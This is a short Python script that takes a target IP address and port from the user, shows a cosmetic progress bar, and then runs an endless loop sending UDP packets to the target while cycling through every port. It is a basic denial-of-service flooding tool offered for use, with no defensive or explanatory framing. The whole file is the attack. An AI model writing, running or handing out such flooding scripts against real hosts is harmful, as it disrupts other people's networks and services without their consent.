#!/usr/bin/env python3
from datetime import datetime
import socket
import sys
import time


def get_current_date_time() -> str:
    now: datetime = datetime.now()
    return now.strftime("%d/%m/%Y %H:%M:%S")


ip = input("IP Target : ")
try:
    port = int(input("Port: "))
except ValueError:
    print('Invalid value')
    sys.exit(1)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
for i in range(5):
    print('[', end='')
    for j in range(i * 4):
        print('=', end='')
    for k in range(16 - i * 4):
        print(' ', end='')
    print(f'] {i * 25}%')
    time.sleep(0.5)

packets_count: int = 0
print('Started at ', get_current_date_time())
while True:
    sock.sendto(b'1', (ip, port))
    packets_count += 1
    port += 1
    print(f"Sent {packets_count} packet to {ip} through port:{port}")
    if port == 65534:
        port = 1
